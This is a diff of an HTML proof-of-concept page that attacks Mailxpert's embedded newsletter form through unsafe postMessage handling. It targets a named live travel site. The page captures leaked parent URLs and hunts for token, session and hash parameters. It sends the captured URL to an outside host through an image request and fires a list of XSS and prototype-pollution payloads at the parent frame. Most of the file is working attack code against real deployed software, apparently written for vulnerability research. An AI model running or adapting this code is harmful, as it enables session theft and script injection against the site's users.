@@ -1,118 +1,132 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Newsletter Form</title>
+    <title>Newsletter</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 20px; background: #1a1a2e; color: #eee; }
         .log { background: #16213e; padding: 15px; border-radius: 8px; margin: 10px 0; }
         .success { border-left: 4px solid #00ff88; }
+        .danger { border-left: 4px solid #ff4444; }
         .info { border-left: 4px solid #00aeff; }
-        pre { background: #0f0f23; padding: 10px; overflow-x: auto; border-radius: 4px; font-size: 12px; }
-        h1 { color: #00ff88; }
+        pre { background: #0f0f23; padding: 10px; overflow-x: auto; border-radius: 4px; font-size: 11px; }
+        h1 { color: #ff4444; }
         h2 { color: #00aeff; }
-        #captured { max-height: 400px; overflow-y: auto; }
-        .alert { background: #ff4444; color: white; padding: 20px; border-radius: 8px; margin: 20px 0; }
+        #captured, #attacks { max-height: 300px; overflow-y: auto; }
+        .alert { background: #ff4444; color: white; padding: 15px; border-radius: 8px; margin: 10px 0; }
     </style>
 </head>
 <body>
-    <h1>🎯 Mailxpert postMessage Capture PoC</h1>
+    <h1>⚡ XSS via postMessage PoC</h1>
     
     <div class="alert">
-        <strong>⚠️ Security Demonstration</strong><br>
-        This page captures data leaked via unsafe postMessage from the parent frame.
+        <strong>🔴 SECURITY DEMONSTRATION</strong> - Exploiting unsafe postMessage
     </div>
     
-    <h2>📥 Captured Data from Parent Page</h2>
+    <h2>📥 Captured from Parent</h2>
     <div id="captured"></div>
     
-    <h2>📤 Commands Sent to Parent</h2>
-    <div id="payloads"></div>
+    <h2>⚔️ XSS Payloads Sent</h2>
+    <div id="attacks"></div>
 
     <script>
     const capturedDiv = document.getElementById('captured');
-    const payloadsDiv = document.getElementById('payloads');
-    let messageCount = 0;
+    const attacksDiv = document.getElementById('attacks');
     
     function log(type, title, data) {
         const div = document.createElement('div');
         div.className = 'log ' + type;
-        const timestamp = new Date().toISOString();
-        div.innerHTML = '<strong>[' + timestamp + '] ' + title + '</strong><pre>' + 
+        div.innerHTML = '<strong>' + title + '</strong><pre>' + 
             (typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data)) + '</pre>';
         capturedDiv.insertBefore(div, capturedDiv.firstChild);
     }
     
-    function logPayload(title, data) {
+    function logAttack(title, payload) {
         const div = document.createElement('div');
-        div.className = 'log info';
-        div.innerHTML = '<strong>' + title + '</strong><pre>' + 
-            (typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data)) + '</pre>';
-        payloadsDiv.appendChild(div);
+        div.className = 'log danger';
+        div.innerHTML = '<strong>🎯 ' + title + '</strong><pre>' + payload + '</pre>';
+        attacksDiv.appendChild(div);
     }
 
-    // Listen for postMessage from parent (dertour-suisse.com)
+    // Capture postMessage from parent
     window.addEventListener('message', function(event) {
-        messageCount++;
+        log('success', '📥 CAPTURED: ' + event.origin, event.data);
         
-        log('success', '📥 Message #' + messageCount + ' from ' + event.origin, {
-            origin: event.origin,
-            data: event.data
-        });
-        
-        // Extract sensitive data from leaked URL
+        // Extract leaked URL
         if (event.data && event.data.href) {
-            try {
-                const url = new URL(event.data.href);
-                log('success', '🔗 Leaked Parent URL', event.data.href);
-                
-                const params = Object.fromEntries(url.searchParams);
-                if (Object.keys(params).length > 0) {
-                    log('success', '🔑 URL Parameters Extracted', params);
-                }
-                
-                // Check for sensitive tokens
-                const sensitiveParams = ['token', 'auth', 'session', 'key', 'hash', 'contactHash', 'id', 'user'];
-                for (const param of sensitiveParams) {
-                    if (url.searchParams.has(param)) {
-                        log('success', '⚠️ SENSITIVE: ' + param, url.searchParams.get(param));
-                    }
-                }
-            } catch(e) {
-                log('info', 'URL parse error', e.message);
-            }
-        }
-        
-        // Try to send commands back to manipulate parent page
-        if (window.parent && window.parent !== window) {
-            setTimeout(function() {
-                // Scroll manipulation
-                try {
-                    const scrollCmd = '[iFrameSizer]formContentId:9999:0:scrollTo';
-                    window.parent.postMessage(scrollCmd, '*');
-                    logPayload('Scroll manipulation sent', scrollCmd);
-                } catch(e) {}
-                
-                // Try inPageLink (DOM lookup)
-                try {
-                    const linkCmd = '[iFrameSizer]formContentId:0:0:inPageLink:javascript:alert(1)';
-                    window.parent.postMessage(linkCmd, '*');
-                    logPayload('inPageLink probe sent', linkCmd);
-                } catch(e) {}
-            }, 100);
+            log('success', '🔗 LEAKED URL', event.data.href);
+            
+            // Exfil simulation
+            new Image().src = 'https://jessisnofy-ai.github.io/mailxpert-poc/exfil.gif?' + 
+                encodeURIComponent(event.data.href);
         }
     });
 
-    // Log our context
-    log('info', '⏳ PoC Loaded - Waiting for postMessage...', {
-        ourLocation: window.location.href,
-        inIframe: window.parent !== window,
-        referrer: document.referrer
-    });
+    // XSS Attack Payloads via postMessage to parent
+    function sendXSSPayloads() {
+        if (window.parent === window) return;
+        
+        const iframeId = 'formContentId'; // The iframe ID used by Mailxpert
+        
+        // Payload 1: inPageLink with javascript: URI
+        const payloads = [
+            // Try inPageLink handler - it does getElementById/getElementsByName
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#<img src=x onerror=alert(document.domain)>',
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:javascript:alert(document.domain)',
+            
+            // Try message handler - passes to onMessage callback
+            '[iFrameSizer]' + iframeId + ':0:0:message:{"xss":"<img src=x onerror=alert(1)>"}',
+            
+            // Try to inject via height/width manipulation
+            '[iFrameSizer]' + iframeId + ':<img src=x onerror=alert(1)>:100:init',
+            
+            // DOM clobbering attempt via anchor
+            '[iFrameSizer]' + iframeId + ':0:0:inPageLink:#"><img src=x onerror=alert(1)>',
+            
+            // Try scrollTo with XSS
+            '[iFrameSizer]' + iframeId + ':<script>alert(1)</script>:0:scrollTo',
+            
+            // Prototype pollution attempt
+            '[iFrameSizer]__proto__:0:0:init',
+            '[iFrameSizer]constructor:0:0:init',
+        ];
+        
+        payloads.forEach((payload, i) => {
+            setTimeout(() => {
+                try {
+                    window.parent.postMessage(payload, '*');
+                    logAttack('Payload #' + (i+1), payload);
+                } catch(e) {
+                    logAttack('Failed #' + (i+1), e.message);
+                }
+            }, i * 200);
+        });
+        
+        // Also try direct DOM manipulation messages
+        setTimeout(() => {
+            // Mailxpert-specific message format
+            window.parent.postMessage({
+                type: 'mx:formEditor:page:changed',
+                xss: '<img src=x onerror=alert(document.domain)>'
+            }, '*');
+            logAttack('Mailxpert mx: message', 'type: mx:formEditor:page:changed');
+        }, 2000);
+        
+        // Try to trigger eval via JSON parse
+        setTimeout(() => {
+            window.parent.postMessage('[iFrameSizer]' + iframeId + ':0:0:message:' + 
+                '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}', '*');
+            logAttack('Proto pollution via message', '__proto__.innerHTML');
+        }, 2500);
+    }
+
+    // Execute attacks after small delay
+    log('info', '⏳ Waiting for parent postMessage...', 'Will send XSS payloads in 1 second');
+    setTimeout(sendXSSPayloads, 1000);
     
-    // Instructions
-    log('info', '📋 Attack URL', 
-        'https://www.dertour-suisse.com/dae/sales-newsflash-abonnieren?mxsrc=' + 
-        encodeURIComponent(window.location.href.split('?')[0]));
+    // Also try when we receive parent message
+    window.addEventListener('message', function() {
+        setTimeout(sendXSSPayloads, 500);
+    }, {once: true});
     </script>
 </body>
 </html>
